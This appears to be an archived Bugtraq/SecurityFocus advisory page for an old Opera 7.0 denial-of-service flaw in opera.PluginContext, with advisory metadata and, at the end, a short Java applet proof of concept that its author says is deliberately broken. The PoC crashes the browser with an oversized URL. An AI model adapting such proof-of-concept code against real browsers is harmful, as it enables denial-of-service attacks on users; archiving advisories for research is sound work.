@@ -1,0 +1,107 @@
+#SpeeDr00t@Black Falcon<br>#bid6814<p><b><span style="font-size: 18pt;">Opera opera.PluginContext Native Method Denial Of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/6814/info">info</a><br><a href="http://www.securityfocus.com/bid/6814/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/6814/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/6814/solution">solution</a><br><a href="http://www.securityfocus.com/bid/6814/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				6814
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Failure to Handle Exceptional Conditions
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 10 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 10 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this issue is credited to Marc Schoenefeld &lt;schonef@uni-muenster.de&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Opera Software Opera Web Browser 7.0 win32 Beta 2<br/>
+					
+				
+					Opera Software Opera Web Browser 7.0 win32 Beta 1<br/>
+					
+				
+					Opera Software Opera Web Browser 7.0 win32<br/>
+					
+				
+					Opera Software Opera Web Browser 7.0 1win32<br/>
+					
+				
+					Opera Software Opera Web Browser 6.0.5 win32<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof-of-concept was provided:<br/><br/>//Marc Schoenefeld 1/13/2003, www.illegalaccess.org<br/>//not runnable, a little crippled, there are couple of obvious syntax errors<br/>to avoid script-kidding<br/><br/>...<br/>import opera.PluginContext; // !! import the vulnerable class<br/>...<br/><br/>public class OperaCall2 extends App1et<br/>{<br/>- -<br/>- -    public OperaCall2()<br/>- -    {<br/>- -    }<br/>- -<br/>- -    public void paint(Graphics g)<br/>- -    {<br/>- -        PluginContext plugincontext = new PluginContext(l);<br/>- -        try<br/>- -        {<br/>- -            plugincontext.showDocument(new URL("http://xxx.xxx" + new<br/>String(new byte30000)));<br/>- -        }<br/>- -        catch(Exception exception)<br/>- -        {<br/>- -            exception.printStackTrace();<br/>- -        }<br/>- -    }<br/>}
+	
+		<ul>
+</ul>
+</div>
